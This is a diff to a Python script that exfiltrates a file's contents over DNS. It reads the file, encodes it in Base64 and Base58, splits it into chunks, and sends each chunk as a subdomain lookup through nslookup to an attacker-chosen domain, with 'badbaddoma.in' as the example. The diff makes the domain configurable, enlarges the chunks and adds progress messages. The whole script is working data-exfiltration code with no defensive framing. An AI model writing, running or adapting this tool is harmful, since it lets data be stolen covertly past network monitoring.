@@ -13,12 +13,15 @@ def Base64Encoder(text):
 	base64_bytes = base64.b64encode(sample_string_bytes) 
 	base64_string = base64_bytes.decode('ascii')
 
+	print('[+] Base64 encoded.')
 	return base64_string
 
 def Base58Encoder(text):
+	print('[+] Base58 encoded.')
 	return base58.b58encode(text)
 
 def Base58Decoder(text):
+	print('[+] Base58 decoded.')
 	return base58.b58decode(text)
 
 def Base64Decoder(text):
@@ -27,6 +30,7 @@ def Base64Decoder(text):
 	sample_string_bytes = base64.b64decode(text) 
 	sample_string = sample_string_bytes.decode('ascii')
 
+	print('[+] Base64 decoded.')
 	return sample_string
 
 ##################
@@ -35,6 +39,7 @@ def Base64Decoder(text):
 
 def ReadFrom(file):
 	try:
+		print('[+] Reading file.')
 		with open(file, 'r') as r:
 			return r.read()
 	except FileNotFoundError:
@@ -60,6 +65,11 @@ def Encryptor(text):
 # Get filname from user input
 fileAt = input('Filename: ')
 
+# Your domain name
+DOMAIN_NAME = ''
+while DOMAIN_NAME == '':
+	DOMAIN_NAME = input('Domain Name (Example: badbaddoma.in): ')
+
 # Subdomains place holder
 subdomain_holder = []
 
@@ -69,32 +79,29 @@ if plain_text != None:
 	encode_text = Base58Encoder(Base64Encoder(plain_text))
 
 	# Approx. number of subdomains
-	MAGIC_NUM = math.ceil(len(encode_text)/9)
+	MAGIC_NUM = math.ceil(len(encode_text)/20)
 	_NUM = 0
 
 	# Subdomain filtering
 	while _NUM < MAGIC_NUM:
 
-		subdomain_holder.append(Encryptor(encode_text[0:9].decode('utf-8')))
-		encode_text = encode_text[9::]
+		subdomain_holder.append(Encryptor(encode_text[0:20].decode('utf-8')))
+		encode_text = encode_text[20::]
 		_NUM += 1
-
-	print(subdomain_holder)
 
 	full_text = ''
 	perFinish = 0
-	input('Start transmitting... [ENTER]')
+	input('Start transmitting... [PRESS ENTER KEY]')
 	for subdomain in subdomain_holder:
-		FQDN = subdomain + '.badbaddoma.in'
+		FQDN = subdomain + f'.{DOMAIN_NAME}'
 
 		print(f"{perFinish/len(subdomain_holder)*100:.1f} %", end="\r")
 
-		#process = subprocess.Popen(["nslookup", FQDN])
 		ret = subprocess.call( ['nslookup', FQDN], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 		time.sleep(0.30)
-		#os.system(cmd)
+
 		full_text += subdomain[1:-2]
 
 		perFinish += 1
 
-	print(''.join(subdomain_holder),'\n\n\n',full_text)
+print('Done.')
